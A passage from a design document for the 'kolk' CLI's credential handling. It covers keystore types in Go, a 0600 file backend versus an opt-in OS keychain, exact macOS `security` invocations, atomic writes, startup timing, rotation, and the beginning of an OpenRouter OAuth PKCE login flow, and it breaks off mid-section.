    BackendFile     Backend = "file"     // value inline in the 0600 manifest. THE DEFAULT, every OS.
    BackendKeychain Backend = "keychain" // macOS Keychain / Linux Secret Service. Opt-in.
    BackendDPAPI    Backend = "dpapi"    // Windows: CryptProtectData over the same manifest. v0.2.
    BackendHelper   Backend = "helper"   // kolk-credential-<name>, docker-shaped. v0.3.
)

// Entry is METADATA. There is deliberately no field a plaintext can occupy, and
// a reflect-walk test fails on any added one. List() returns []Entry, which is
// the structural reason `kolk key` and `kolk doctor` CANNOT print a secret.
//
// KeyHash is the full sha256hex and is used ONLY for rotation detection and for
// the --manage deep link. It is never rendered (§1.6).
type Entry struct {
    Ref      Ref
    Backend  Backend
    Helper   string    // when Backend == BackendHelper
    Mask     string    // "sk-or-v1-…FAKE"
    KeyHash  string    // sha256hex(plaintext) — 0600-only, never displayed
    Machine  string    // the host that wrote it — so a lockout can NAME the machine (§3.5)
    Created  time.Time
    Verified time.Time // zero == never verified against the provider
    Source   string    // "paste" | "stdin" | "prompt" | "oauth" | "migrated"
    Note     string    // "stored for v0.2" | "" — never free-form user text
}

var (
    ErrNotFound     = errors.New("keystore: no credential for this provider")   // → continue the chain
    ErrLocked       = errors.New("keystore: the credential store is locked and cannot prompt here")
    ErrUnavailable  = errors.New("keystore: no credential store of this kind on this machine")
    ErrTimeout      = errors.New("keystore: the credential store did not answer in time")
    ErrCorrupt      = errors.New("keystore: the credential file is unreadable")
    ErrForeignOwner = errors.New("keystore: the credential file is owned by another user")
    ErrTooLarge     = errors.New("keystore: credential exceeds the 2560-byte portable limit")
)

type Store interface {
    Name() Backend

    // Available is the CHEAP NEGATIVE TEST only: env vars and LookPath. No spawn,
    // no D-Bus, no network, no prompt, always < 1 ms. It is a WRITE-TIME
    // PREFERENCE HINT, never a correctness claim — availability is an outcome,
    // not an inference (§3.6).
    Available(ctx context.Context) error

    Get(ctx context.Context, r Ref) (secret.Value, error)
    Set(ctx context.Context, r Ref, v secret.Value) error
    Del(ctx context.Context, r Ref) error

    // Probe reports EXISTENCE and metadata WITHOUT reading the value. Contract,
    // asserted by TestProbeNeverAsksForData: it reads the manifest and
    // process-local state, and at most issues a metadata-only backend query that
    // provably cannot request secret data (macOS: no -g/-w/-d in argv). Always
    // under a 2 s deadline. This is what makes `kolk doctor` unable to prompt.
    Probe(ctx context.Context, r Ref) (Entry, error)

    List(ctx context.Context) ([]Entry, error) // metadata only — cannot leak
}
```

The chain and its **secret-free, non-marshallable** trace:

```go
type Link uint8

const (
    LinkFlag        Link = 0 // STRUCTURALLY EMPTY, and printed as empty
    LinkExplicitEnv Link = 1 // KOLK_API_KEY
    LinkProviderEnv Link = 2 // OPENROUTER_API_KEY, ANTHROPIC_API_KEY, …
    LinkStore       Link = 3 // the manifest entry → its ONE named backend
    LinkNone        Link = 4
)

type Status uint8

const (
    StatusMiss Status = iota // consulted, holds nothing → continue
    StatusHit
    StatusShadowed // holds a credential; an earlier link won
    StatusSkipped  // not applicable (no manifest entry for this Ref; no $HOME)
    StatusFailed   // locked / unavailable / timed out / corrupt → STOP
)

// Origin, Step and Resolution carry a mask and a link name. They are
// credential-ADJACENT, and therefore:
//   * they have NO json tags and NO MarshalJSON,
//   * `internal/protocol` may not import this package (arch rule S5),
//   * the same reflect-walk that bans secret.Value from every event, session,
//     stats row and dashboard record also bans these three types.
// A `credential.resolved` event is exactly the feature that would otherwise put
// a mask and a key-derived digest onto the SSE wire and into SQLite. There is no
// such event, and the test says so.
type Origin struct {
    Link    Link
    Source  string // "OPENROUTER_API_KEY" | "file" | "keychain" | "helper:1password"
    Detail  string // "~/.local/share/kolk/credentials.json (0600)"
    Mask    string
    Finger  string // per-process salted; never a key-derived digest
    Added   time.Time
}

type Step struct {
    Link    Link
    Source  string
    Status  Status
    Reason  string // a human sentence: "not set", "keychain timed out after 2s"
    Origin  *Origin
    Elapsed time.Duration
}

// Resolution is ALWAYS fully populated: every link, in order, including the
// empty and the shadowed ones.
type Resolution struct {
    Ref   Ref
    Steps []Step
    Won   int // index into Steps, or -1
}

type Chain struct{ /* links []Source; getenv func(string) string (INJECTED — the
                      only env read on the credential path, and testable) */ }

// Resolve walks the chain, stops at the first hit, then Probes (never Looks up)
// the remaining links so the trace records what was shadowed.
func (c *Chain) Resolve(ctx context.Context, r Ref) (secret.Value, Resolution, error)

// Explain walks EVERY link with no early exit and never reads a value.
// `kolk doctor` and `kolk key --why` call this and nothing else.
func (c *Chain) Explain(ctx context.Context, r Ref) Resolution

// Begin starts a Resolve in a goroutine and returns the awaitable promise handed
// to the provider layer. For the file backend it is a 23 µs no-op; for an opt-in
// keychain it overlaps a ~15 ms read with a 22–26 ms TLS handshake (§3.7).
func (c *Chain) Begin(ctx context.Context, r Ref) secret.Credential
```

#### 2.6 The files, named per arch §2

```
internal/redact/                       L0 · stdlib only · imports nothing from internal/
├── redact.go        Mask · Scrub · ScrubString · Register · Writer (streaming, 128 B holdback)
├── shapes.go        //go:embed keyshapes.json — ONE table, THREE consumers:
│                    key inference (§0.2) · scrub shape patterns (§5.4) · bash env subtraction (§5.6)
├── keyshapes.json
├── control.go       SanitizeControls — keep \n \t; drop all other C0, all C1, all OSC,
│                    every CSI kolk did not generate (§5.3 M5)
├── redact_test.go  scrub_test.go  control_test.go
└── testdata/        falsepositives.txt (≈200 real non-secret strings) · splitpoints/ · golden/

internal/secret/                       L0 · touches NO OS · imports only internal/redact
├── secret.go        Value · New · NewString · Reveal · Mask · Fingerprint · IsZero
├── vault.go         the process-local vault · Close
├── credential.go    Credential · Promise
├── transport.go     ★ AuthTransport — the ONLY Authorization header in the tree
└── secret_test.go   the golden printing matrix, run TWICE (host field exported AND unexported)

internal/keystore/                     L0 · the ONLY reader/writer of a credential
├── keystore.go      Ref · Backend · Entry · Store · the typed errors
├── chain.go         Link · Status · Origin · Step · Resolution · Chain{Resolve,Explain,Begin}
├── manifest.go      the 0600 routing table: load · atomic write under internal/lock · orphan report
├── backend.go       ★ encode/decode for EVERY backend ("kolk-b64:" + base64) — Reveal() site #3
├── file_unix.go     //go:build !windows   O_NOFOLLOW · uid check · 0600 · chmod-after-create
├── file_windows.go  //go:build windows    atomicfile + ACL note; NO Stat_t, NO O_NOFOLLOW
├── keychain_darwin.go   opt-in: /usr/bin/security -i, exit-code table, 2 s deadline
├── keychain_unix.go     opt-in: secret-tool, opportunistic only, never dbus-launch
├── dpapi_windows.go     v0.2 (step 13): enc:"dpapi" over the same manifest value
├── helper.go            v0.3: kolk-credential-<name>, docker-shaped
├── spawn.go         the Spawner PORT — so keystore imports no os/exec and every backend
│                    is unit-testable with a scripted fake and no real `security` binary
├── migrate.go       config.json api_key → the manifest, once, idempotent
└── *_test.go        + testdata/v0-config-with-key.json · testdata/manifest-*.json
```

**`redact.Mask` fixes a live bug.** `cmd/kolk/main.go:554` is
`k[:6] + "…" + k[len(k)-4:]`. Reproduced today:

```
len= 9  in=123456789    out=123456…6789     ← the whole key, plus a duplicated character
len=10  in=1234567890   out=123456…7890     ← the whole key, with an ellipsis through the middle
```

and `k[:6]` on a real OpenRouter key is `sk-or-`, six characters of pure boilerplate.

```go
// Mask shows the longest matching SHAPE prefix (which types the key) plus the
// last 4 (which disambiguates it against the provider's dashboard — the actual
// task a human performs with a masked key). gh shows prefix only, so two tokens
// of one type are indistinguishable; AWS shows last-4 only, so you cannot tell
// what it is. Take both halves.
//
// INVARIANT, asserted: at least 8 characters hidden, and the two slices can
// never overlap.
func Mask(s string) string {
    const tail, minHidden = 4, 8
    if len(s) < tail+minHidden { return "…" }
    p := ShapePrefix(s)                                   // "" when unknown
    if p == "" && len(s) >= 4+tail+minHidden { p = s[:4] }
    if len(p)+tail+minHidden > len(s) { p = "" }
    return p + "…" + s[len(s)-tail:]
}
```

---

### 3. Storage — per OS, with the verified facts

#### 3.1 The verdict

**The 0600 manifest is the default on every OS. The OS keychain is opt-in, per machine, per
credential.** Three independent reasons, in order of force:

1. **Coverage.** The file works with no OS session, no D-Bus, no GUI, no browser and no network —
   laptop, SSH, container, CI, read-only rootfs, alike. A "default" that works on one platform of
   three is not a default; it is a special case pretending to be one.
2. **It cannot prompt.** `/usr/bin/security` has **no non-interactive flag** — the whole global flag
   set is `[-hilqv] [-p prompt]` (`man security`, this machine). There is no CLI equivalent of
   `SecKeychainSetUserInteractionAllowed(false)`. `errSecInteractionNotAllowed` (exit 36) is
   returned only when there is *no GUI session to prompt in*; with a GUI session and a login keychain
   locked by an inactivity timer, by sleep, or by an explicit `security lock-keychain`, a data read
   **raises the SecurityAgent password dialog**. Making that the default would put a macOS login
   password prompt on the turn path of the product's primary platform.
3. **Honesty about what it buys.** The keychain item's ACL trusts **`/usr/bin/security`, pinned by
   `identifier "com.apple.security" and anchor apple`** — kolk is not in the ACL at all. That is
   what makes reads prompt-free across upgrades (§3.4), and it is *also* why **any process running
   as the user can read the value back with no prompt**. Against the two threats that actually
   dominate a developer laptop — the model under prompt injection, and a compromised dependency in
   the project kolk is working in — a Keychain item and a 0600 file are **equivalent**.

> **The claim kolk makes, in `doctor`, in the one-time notice, and in the docs, is exactly this and
> nothing more:** *"The OS keychain encrypts the credential at rest — against a stolen disk, a
> backup, a synced dotfiles directory. It gives you nothing against code running as you, which can
> read it back with no prompt."*

The genuinely better answer is **AWS's, not `gh`'s: deprecate the credential rather than defend the
file.** `kolk login` mints a narrow, user-controlled, individually revocable, dashboard-visible
OpenRouter key, and `kolk key --manage` is one command from any stored key to its revoke page.
Storage secrecy matters less when the credential is cheap to rotate — which makes `kolk login` a
*security* argument, not only a UX one.

#### 3.2 Where the file lives, and why not the config dir

`paths.Data()/credentials.json`, mode **0600**, in a **0700** directory.

| OS | Path |
|---|---|
| Linux / macOS | `$XDG_DATA_HOME/kolk/credentials.json`, else `~/.local/share/kolk/credentials.json` |
| Windows | `%LocalAppData%\kolk\credentials.json` — **never `%AppData%`, which roams to a domain profile server** |

Three reasons for the *data* dir over the config dir, the first decisive: a credential must not roam;
`~/.config` is precisely the directory people commit to a dotfiles repo; and a credential is state,
not configuration. `internal/paths` owns this and **item 18's config layering never touches this
file**.

#### 3.3 The manifest — a routing table, not just a keyfile

```jsonc
{
  "version": 1,
  "credentials": {
    "openrouter/default": {
      "backend":  "file",
      "value":    "kolk-b64:c2stb3ItdjEt…",   // ABSENT for every backend except file
      "mask":     "sk-or-v1-…FAKE",
      "key_hash": "9a3f2c1188de4c07…",        // full sha256hex — 0600-only, never rendered
      "machine":  "mba.local",
      "created":  "2026-08-22T18:04:11Z",
      "verified": "2026-08-22T18:04:12Z",
      "source":   "paste"
    },
    "anthropic/default": {
      "backend": "keychain",                   // no "value" field exists here
      "mask": "sk-ant-…8f10", "key_hash": "1b2c…", "machine": "mba.local",
      "created": "2026-08-22T18:09:40Z", "source": "paste", "note": "stored for v0.2"
    }
  }
}
```

**The manifest always records where every credential is, even when the value is elsewhere.** Five
things fall out:

1. **Reads never probe.** One `os.ReadFile` says `openrouter/default → file`, and that is the only
   decision. No `security` spawn to discover *whether* a keychain exists.
2. **Exactly one backend per credential.** Mutually exclusive, not a cascade (§1.1).
3. **`kolk doctor` costs zero backend *value* reads** — so it cannot raise a dialog.
4. **Deleting is complete**, and a half-removed credential is visible (§3.8 orphans).
5. **Rotation detection is free**: `sha256hex(resolved) != entry.key_hash`.

**No obfuscation.** The value is stored as-is (base64-tagged for transport safety, not for secrecy).
Docker base64s its config and users believe it is encrypted; that is worse than plaintext, because
it is a lie. Encryption happens only where the **OS holds the key** — Keychain, Secret Service,
DPAPI — and nowhere else. kolk will not ship a file "encrypted" with a key derived from something on
the same disk, and a passphrase prompt on every start is a North-star violation.

**`value` is `"kolk-b64:" + base64` in every backend, one encoder, one decoder, one test.** On macOS
it is load-bearing: `security find-generic-password -w` prints the value raw only when every byte is
printable 7-bit ASCII, and otherwise flips the whole output to an **unmarked hex dump** — making the
literal secret `"6162"` indistinguishable from hex for `ab`. The base64 alphabet guarantees the raw
path. **Size guard: 2560 bytes of raw secret on every platform**, the Windows
`CRED_MAX_CREDENTIAL_BLOB_SIZE` — the tightest of the three — so a key that works on macOS cannot
fail on Windows in 2027.

#### 3.4 The file backend, and the three defects it fixes

Verified on this machine today:

| Behaviour | Result |
|---|---|
| `os.WriteFile(p, b, 0600)` on a pre-existing 0644 file | **stays 0644** — `go doc os.WriteFile`: *"truncates it before writing, **without changing permissions**"* |
| `O_CREATE\|O_EXCL\|O_WRONLY` 0600 → `f.Chmod(0600)` → `os.Rename` | lands **0600** — the rename replaces the inode, which is what repairs the mode |
| `syscall.Stat_t`, `syscall.O_NOFOLLOW` under `GOOS=windows` | **undefined: compile error** — hence `file_unix.go` / `file_windows.go` from step 5 |
| `GOOS=windows go build ./...` on the repo **today** | **exit 0** — Windows builds and works via `OPENROUTER_API_KEY` + `config.json`, and **must not regress** |

```go
// write is the ONLY writer of a credential file. Never os.WriteFile on the
// target. The temp name is RANDOM, not a fixed ".tmp": two kolks racing on a
// fixed name corrupt it, and a symlink pre-created at a predictable path turns
// a save into a write primitive.
func write(dir, name string, data []byte) (err error) {
    if err := os.MkdirAll(dir, 0o700); err != nil { return err }
    _ = os.Chmod(dir, 0o700)                                     // tighten a pre-existing 0755
    tmp := filepath.Join(dir, "."+name+".tmp"+randSuffix())
    f, err := openExclNoFollow(tmp)                              // _unix / _windows twins
    if err != nil { return err }
    defer func() { if err != nil { f.Close(); os.Remove(tmp) } }()
    if err = chmodOwnerOnly(f); err != nil { return err }         // defeats a umask that clears owner bits
    if _, err = f.Write(data); err != nil { return err }
    if err = f.Sync(); err != nil { return err }
    if err = f.Close(); err != nil { return err }
    if err = os.Rename(tmp, filepath.Join(dir, name)); err != nil { return err }
    return fsyncDir(dir)                                          // no-op on windows
}
```

Read path: `os.Lstat` first. **Symlink → refuse** (`ErrCorrupt`, name the path). **Owned by another
uid → refuse** (`ErrForeignOwner`) — that is a real attack. **Mode has group/other bits → repair to
0600 and print one line**, do not refuse: kolk is not `ssh`, and a user whose backup restored 0644
must not lose their agent. Loud once, silent thereafter.

**Windows is unix-agnostic from step 5, not step 13.** `file_windows.go` writes through
`internal/atomicfile` (which already has both twins per arch §2), skips the uid and symlink checks,
and prints *"protected by your user profile's ACL, not encrypted"* instead of claiming 0600. The CI
invariant is **`assertOwnerOnly(t, path)` with a per-GOOS body**, never a literal `0600` comparison —
`os.Chmod` on Windows touches only the read-only bit and `os.Getuid()` returns −1, so a literal
assertion there is either red or silently skipped. DPAPI and Credential Manager are **step-13
upgrades, never prerequisites**.

**Two more things the file backend does on first credential write:** it drops
`$data/kolk/.gitignore` (`credentials.json`, `sessions/`, `stats.jsonl`) — costs nothing, catches the
dotfiles-repo case, which is the most common real-world exposure of a 0600 file — and it
**`statfs`-checks the target**: on `nfs`, `smbfs`, `afpfs` or `fuse.*` it prints one line naming the
filesystem, because on NFSv3 the UID is asserted by the client and *any machine that can mount the
export reads the file*. **That is the one situation where the keychain is genuinely the right
default, and `doctor` says so there.**

**Migration** (`keystore/migrate.go`, runs once, from a *write* command or the first store read that
finds no manifest): if `$config/kolk/config.json` has a non-empty `api_key`, write
`openrouter/default` into the manifest, rewrite `config.json` **without** the field through the same
atomic writer, print one line. Idempotent. `testdata/v0-config-with-key.json` proves it in the same
commit.

**★ The highest-leverage single change in this item:** after the migration, `config.json` contains no
credential and no credential-shaped key, and `internal/config` does not import `internal/keystore`
(import rule). So `kolk config show`, `kolk config edit`, a config paste in a bug report and *"cat
your config for me"* become safe **by construction**, and no redaction pass is ever load-bearing
there.

#### 3.5 When a backend is unavailable, locked, or on another machine

There is **no read-time cascade**. A recorded backend that cannot answer produces a named,
actionable error — and, critically, **a recovery that does not read the failing backend**:

```console
$ kolk "hi"
kolk cannot reach the credential store for openrouter/default.

  recorded  keychain, written on mba.local
  problem   the macOS login keychain is locked and cannot prompt in this session (SSH)

  paste a new key here — this writes to the best backend on THIS machine and
  replaces the unreachable entry, without reading it:

      kolk key sk-or-v1-…            (or: pbpaste | kolk key)

  or move the existing entry once you are back at that machine:
      kolk key --backend file
```

`kolk key <newkey>` **always** overwrites the manifest entry into a backend that works here, and
**never** requires reading the old one. This closes the two lockouts every keychain-first draft had:
(a) set up on the Mac, then SSH into it; (b) sync `~/.local/share/kolk` to a devbox or devcontainer,
where the manifest travels but the Keychain item does not (macOS items created via
`add-generic-password` carry no `kSecAttrSynchronizable` and do not sync).

#### 3.6 The keychain backend — opt-in, and its exact contract

**macOS — `keychain_darwin.go`.** Spawning `/usr/bin/security` is not a compromise; it is *better
than* an in-process integration, and this is the argument:

`man security`: *"By default, the application which creates an item is trusted to access its data
without warning."* The ACL of an item created by `security` names
`/usr/bin/security` with `requirement: identifier "com.apple.security" and anchor apple` — an
identity+anchor pin, not a code hash, and **kolk is not in the ACL at all**. Rebuilds, `go install`
vs a release tarball, an ad-hoc signature, `kolk update` — none of it can invalidate an ACL that was
never about kolk. (`gh` demonstrates this in production: `gh auth status` reads a keyring token with
no prompt across Homebrew upgrades, because `zalando/go-keyring` shells out to the same binary.)

The contrast is decisive: an item created by a Go binary via `-T` gets a bare **`cdhash`**
requirement, because `go build` emits `flags=0x20002(adhoc,linker-signed) Identifier=a.out` — there
is no stable identity to pin. And that hash **moves when `-ldflags "-X buildinfo.Version=…"` changes**,
which is exactly how kolk stamps its version (arch §2). A cgo/Security.framework integration would
therefore raise *"kolk wants to use your confidential information…"*, demanding the login password,
**after every release**. The rule is not "sign the binary"; it is **never be in the ACL**.

| Operation | Exact invocation | Why |
|---|---|---|
| **write** | `exec /usr/bin/security -q -i` with the whole command on **stdin**: `add-generic-password -U -s kolk -a "openrouter/default" -D "kolk credential" -w "kolk-b64:…" "<keychain path>"` | `add-generic-password` has **no stdin mode**. `-w <value>` puts the secret in argv (`security`'s own usage: *"Use of the -p or -w options is insecure."*). A bare trailing `-w` calls `getpass(3)`, which reads **`/dev/tty`** when one exists — with a controlling terminal it would steal the user's keystrokes instead of reading kolk's pipe, ask twice, and truncate at `_PASSWORD_LEN` = 128. `security -i` has none of these. |
| **read** | `security find-generic-password -s kolk -a "<ref>" -w "<keychain path>"` | no secret in argv on the read path |
| **probe** (doctor) | the same **without `-g`, `-w`, `-d`** | attributes only, no ACL evaluation, cannot prompt. `cdat`/`mdat` give "stored / never rotated" for free. CI asserts the argv. |
| **delete** | `security delete-generic-password -s kolk -a "<ref>" "<keychain path>"` | — |

Six rules, each from an observed failure:

1. **`-i`, never `-w <value>` in argv.**
2. **The keychain path is a mandatory trailing positional, resolved once per call via
   `security login-keychain`** — and **no value-taking flag may ever be last**. A probe observed
   `-w` with no value swallowing the next argv token, leaving the positional empty and writing
   **silently into whatever keychain happened to be default**. Silent success into the wrong
   keychain, not an error. The resolved path is recorded in the manifest entry so a later read can
   detect that it changed.
3. **Always `kolk-b64:` + base64** (§3.3), and strip the trailing `\n` from `-w` output.
4. **Guard the assembled `-i` line at ≥ 3800 bytes.** `security -i` fails at exactly **4096** bytes
   per line, splitting it and parsing the tail as a bogus command. (`zalando/go-keyring` guards at
   `> 4096` — off by one, so exactly 4096 passes and is silently mangled.)
5. **Branch on the exit code, never the message.** `security` exits `OSStatus mod 256`:
   **44** = not found *and* keychain-file-missing *and* locked-non-default (indistinguishable →
   `ErrNotFound` only when the manifest says this backend should be empty, else `ErrUnavailable`);
   **45** duplicate; **51** auth failed; **36** `errSecInteractionNotAllowed` (the SSH/CI shape) →
   `ErrLocked`; **128** user cancelled → `ErrLocked`; **53** not available. `go-keyring` matches the
   English substring `"could not be found"`, which is locale- and version-fragile.
   `delete-generic-password` writes `password has been deleted.` **to stderr with exit 0** — any
   "stderr non-empty ⇒ failure" parse is a bug.
6. **Never `-A`** (`man security`: *"insecure, not recommended!"*), never `-T <kolk>`, and **never
   `security list-keychains -s`** (it rewrites the user's search list).

Spawn shape: through the `keystore.Spawner` port with a **fixed argv, a cleared `Env`, a real stdin
pipe, and `Setsid: true`** — belt and braces, so that even though `-i` never calls `getpass`,
detaching the controlling tty makes it impossible for any path inside `security` to reach the user's
terminal. **Every call carries `context.WithTimeout(2 s)`.** `gh` uses 60 s; 60 s is a hang, not a
fallback.

**Linux — `keychain_unix.go`, opportunistic only.** There is **no stdlib-only path to Secret
Service and there will not be one**: the API is D-Bus, Go has no D-Bus client, and `godbus/dbus/v5`
is **7,953 LOC across 57 files — 2.3× kolk's entire current codebase (3,399 LOC)** — permanently in
L0, on the credential path. Refused; that would be the largest dependency-policy violation anyone
proposes all project. So Linux uses `secret-tool` when it is present, found via `Spawner.LookPath`,
never as a dependency, and **kolk never spawns `dbus-launch`** (which is what `godbus`'s autolaunch
does on a headless box) and never blocks on a `Prompt` object no prompter will complete.
`libsecret-tools` is in Ubuntu `universe`, pulled in by no default task or metapackage including
`ubuntu-desktop`, so it is absent on a default server install, in every container, and usually over
SSH.

**`Available()` is a write-time preference hint and nothing else.** Its env checks are wrong in both
directions and the code comment says so: `SSH_CONNECTION` is unset inside tmux/mosh/VS Code
Remote-SSH, and on any systemd distro `pam_systemd` exports `DBUS_SESSION_BUS_ADDRESS` for SSH
logins (which is why `systemctl --user` works there) — precisely the case where gnome-keyring is
locked. **Availability is an outcome**: every backend call runs under a 2 s deadline, and
`ErrLocked`/`ErrTimeout`/`ErrUnavailable` route to §3.5's re-paste recovery.

**Backend selection at write time** (never at read time), total budget 5 s:

```
1. explicit --backend        → use it; hard error if unusable (the user asked)
2. Available() cheap hint    → skip a backend that cannot work here, for a NAMED reason
3. write to the best remaining: file (default) | keychain (only if asked) | dpapi | helper
4. READ IT BACK and compare  ← the real availability proof; no canary item, no speculative probe
5. on failure, degrade one step and repeat, printing the reason
6. write the backend value FIRST, then the manifest row, atomically, LAST
```

Step 6's order matters: a crash then leaves a recoverable **orphan** (reported by `doctor`) rather
than a manifest row pointing at nothing.

**Migrating between backends** (`kolk key --backend …`) — read old → write new → **read back and
compare** → update the manifest → delete old. Never delete-then-write. If the last delete fails,
`doctor` reports *"an orphaned copy remains in <backend> — remove it with `kolk key clean`"*,
because a silently orphaned credential is a credential nobody rotates.

#### 3.7 Cold start — the measurement, and the mechanism

Measured on this machine (darwin/arm64, Apple M3, go1.26.4), `CGO_ENABLED=0 -trimpath -ldflags "-s -w"`,
40 runs each:

| Operation | min | **p50** | p90 |
|---|---|---|---|
| `/usr/bin/true` (fork+exec floor) | 1.18 | **1.38** | 1.59 ms |
| **`kolk --help` — today's binary, 6.1 MB** | 5.02 | **5.64** | 6.06 ms |
| `kolk config show` (reads `config.json`) | 4.69 | **5.55** | 5.95 ms |
| 6 × `os.Getenv` (the entire env portion of the chain) | — | **0.24 µs** | — |
| **full chain, file backend: Lstat + perm check + ReadFile + Unmarshal + lookup** | — | **23.1 µs** | — |
| `security find-generic-password -w` (unlocked, from Go) | — | **~15–18 ms** | 21 ms |
| TLS handshake complete to `openrouter.ai` | — | **22–26 ms** | — |

**Three consequences.**

1. **The chain is free.** 23 µs is 0.4 % of a 5.64 ms cold start and 0.08 % of arch §11's 30 ms
   budget. There is nothing to optimise and no cache to build.
2. **A keychain read is ~650× a file read and ~3× kolk's whole cold start.** Keychain-first on every
   invocation takes kolk to ~23 ms: inside the 30 ms hard budget, but it eats the 20 ms soft one and
   pays it on `kolk sessions`, `kolk --help` and every shell completion.
3. **★ The read must not be on the startup path at all — and today it is.** `cmd/kolk/main.go:118`
   calls `config.ResolveAPIKey(cfg)` unconditionally, so `kolk --version`, `kolk sessions` and
   `kolk stats` all pay for a credential resolve they never use. Fix at migration step 5:
   `internal/cli` passes `Provider func(ctx) (provider.Chat, error)` — a **thunk** — into
   `engine.Options`, evaluated on the first turn. And when a non-default backend *is* selected,
   `Chain.Begin` starts the resolve in a goroutine **before `Transport.DialContext`** and
   `AuthTransport` awaits it just before the header is written, so a 15–18 ms keychain read hides
   entirely inside a 22–26 ms handshake: **0 ms observed**.

**The honest exception:** a local model over plain HTTP has no handshake to hide behind.
`--base-url http://localhost:11434` connects in ~1 ms, so a keychain-backed credential costs the full
~15 ms serially, **once per process**, against a local TTFT ≥ 200 ms. Local OpenAI-compatible
endpoints usually need no credential at all, in which case the chain short-circuits at
NOT-REQUIRED (§1.5) and touches no backend. `doctor` suggests `kolk key --backend file` when it sees
a non-TLS base URL with a keychain-backed credential.

**The CI gate is a call-count test, not a timing test** — timing tests on shared runners are flaky
and get muted, and the real invariant is exactly assertable:

```
TestStartupReadsNoCredential — run each verb against a counting Store; assert Get() == 0 for
  version · help · sessions · stats · models --cached · config · completions · doctor
       (doctor calls Explain/Probe, never Get)
  and == 1 for the turn paths (repl · -p · saga · serve's first turn).
TestResolveStartsBeforeDial   — a fake dialer records timestamps; fail if the resolve goroutine
  was not already running.
scripts/check-budgets.sh      — `kolk version` p50 of 20 runs ≤ 15 ms, TIGHTENED from arch's 30 ms
  and measured WITH a credential on disk. A regression here means someone put a read back on the
  startup path.
```

#### 3.8 Concurrency on the manifest

The manifest is a read-modify-write, and today's repo has the anti-pattern to avoid:
`internal/session/session.go:60` and `internal/checkpoint/checkpoint.go:66` both use a **fixed**
`.tmp` suffix with `os.WriteFile`. Two `kolk key` invocations in two shells, or `kolk key` racing
`kolk login` or a running `kolk serve` rewriting `verified`, would lose an update — and a lost entry
whose value lived in a keychain or a helper leaves a **live credential orphaned in the OS store,
invisible to `doctor`, unreachable by `logout`, and therefore never rotated**.

**Rules:** every manifest read-modify-write takes `internal/lock` (already an L0 package, arch §2)
under the same 2 s deadline; the backend value is written before the manifest row; temp files carry
a **random** suffix; `doctor` reports orphans because the manifest is now authoritative about what it
does *not* contain.

#### 3.9 Long-lived processes and rotation

`kolk serve` resolves once at provider construction and memoizes the handle for the process lifetime
— so a keychain is read **at most once per daemon start**, never per request, and the handle is 16
bytes with no plaintext copy. But a user who rotates a leaked key with `kolk key <new>` in another
terminal would otherwise leave the daemon using the leaked key **while `kolk doctor` reports the new
one** — a status command lying during incident response.

**Rules:** the daemon re-resolves on a 401 (item 3's `provider.Decide()` retry table already has the
hook) **and** on a manifest mtime change; `kolk doctor` asks a running daemon over the existing
HTTP+SSE surface rather than reporting the manifest as if it were live; and the comparison across
processes is on the stable `key_hash`, never on a per-process fingerprint.

---

### 4. `kolk login` — OAuth PKCE, optional and never required

#### 4.1 The grammar, settled

Item 4 already spent `kolk login claude`, so the collision has to be resolved here or the two
credential worlds blur exactly where users look.

| Command | Who owns the credential | Mechanism | File |
|---|---|---|---|
| `kolk key <key>` | **kolk** | paste → `Store.Set`. **The path. Works everywhere.** | `cmd_key.go` |
| `kolk login` *(no arg)* | **kolk** | OAuth PKCE → `Store.Set` | `cmd_login.go` — imports `keystore`, **not** `agentcli` |
| `kolk login claude` | **the vendor** | `shell.Handover`: inherited stdio, **no pipes**, `syscall.Exec` where possible (item 4 G1) | `cmd_login_vendor.go` — imports `agentcli`, **not** `secret`/`keystore` |
| `kolk logout [provider]` | — | remove kolk's local copy | `cmd_key.go` |
| `kolk logout claude` | — | **prints `claude auth logout` and exits 0. Does not run it.** (§6.5) | `cmd_login_vendor.go` |

`cli.go` dispatches by argument; the two files share no helper and no formatter, and `arch_test.go`
rule **S4** makes that a CI failure rather than a review comment.

**Bare `kolk login` states the vendor before it acts** — the user who read `kolk login claude` in the
docs and typed `kolk login` must not silently acquire an account at a third party they never named.
Two lines, printed above the URL, before the browser opens:

```
Signing in to OpenRouter — kolk will store the key it gets back.
(For Claude Code that is `kolk login claude`; kolk stores nothing for that.)
```

#### 4.2 The flow, exactly

```
GET  https://openrouter.ai/auth
       ?callback_url=<url-encoded>        omit ⇒ headless code-display mode
       &code_challenge=<base64url(sha256(verifier))>
       &code_challenge_method=S256
       &key_label=kolk

POST https://openrouter.ai/api/v1/auth/keys
       {"code":…, "code_verifier":…, "code_challenge_method":"S256"}
   → 200 {"key":"sk-or-v1-…", "user_id":"user_…"}
```

**PKCE, verified on this machine today.** 32 bytes from `crypto/rand` → `base64.RawURLEncoding` →
43 chars; SHA-256 → `RawURLEncoding` → 43 chars. RFC 7636 §4.2: *"If the client is capable of using
`S256`, it MUST use `S256`."* Feeding RFC 7636 Appendix B's vector
`dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk` through the pipeline reproduces
`E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM` exactly — **and that is also OpenRouter's own OpenAPI
example pair**, which is as close to a conformance statement as exists without an account.
`RawURLEncoding`, never padded.

**`user_id` is dropped on the floor in v0.1.** Decoding an account identifier you have no use for
into a struct that lives next to a credential is how PII arrives by accident — the trap item 4 §5.1
G4 designs against. Named unblocker: it becomes the multi-account discriminator when `--profile`
lands (§7).

**Package split, load-bearing.** `internal/provider/openrouter/oauth.go` is **pure** — no sockets,
no processes, no disk, no clock: `NewPKCE()`, `AuthorizeURL()`, `ExchangeReq()`, `ParseExchange()`.
`internal/cli/cmd_login.go` owns the socket, the browser, the clock, the TTY and the store. So the
whole protocol is tested offline forever, and (arch rule **S2**) the provider package never gains the
ability to open a socket or spawn a process on a credential path.

#### 4.3 The loopback listener — three decisions with teeth

**① Ephemeral port, IPv4 literal.** `net.Listen("tcp4", "127.0.0.1:0")`. RFC 8252 §7.3 requires the
server to allow any port; §8.3: *"the use of `localhost` is NOT RECOMMENDED. Specifying a redirect
URI with the loopback IP literal rather than `localhost` avoids inadvertently listening on network
interfaces other than the loopback interface."* Deliberate documented deviation from §7.3's
dual-stack advice: **IPv4 only** — the callback is issued by a browser on the host we chose, so
dual-stack buys nothing and removes a class of "which family did the browser pick" bugs. Ephemeral
also means no `EADDRINUSE`, no "port 8317 is your dev server", no concurrent-login collision.

**② The CSRF nonce lives in the callback PATH, not a query parameter — and this is forced, not
